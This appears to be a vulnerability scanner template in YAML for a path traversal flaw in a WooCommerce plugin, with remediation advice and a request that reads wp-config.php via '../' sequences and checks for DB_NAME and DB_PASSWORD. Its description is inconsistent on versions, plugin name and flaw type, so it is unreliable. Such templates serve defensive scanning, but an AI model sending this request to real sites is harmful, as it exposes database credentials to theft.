id: wp-woocommerce-file-download
info:
  name: WordPress WooCommerce < 1.2.7 - Arbitrary File Retrieval
  author:
  - l0ne1y
  tags:
  - wordpress
  - woocommerce
  - lfi
  description: |-
    WordPress Plugin WooCommerce before 1.2.7 has a path traversal issue leading to an arbitrary file reading vulnerability
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    There is a path traversal vulnerability in WordPress plugin WooCommerce versions before 1.2.32. The vulnerability is due to the lack of effective filtering and restrictions on file deletion in the product configurator. An unauthenticated user could exploit this vulnerability to access the AJAX operation.
  reference:
  - https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74
  - https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-product-input-fields-for-woocommerce/
  severity: high
  classification:
    cwe-id:
    - cwe-22
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php'
  method: GET
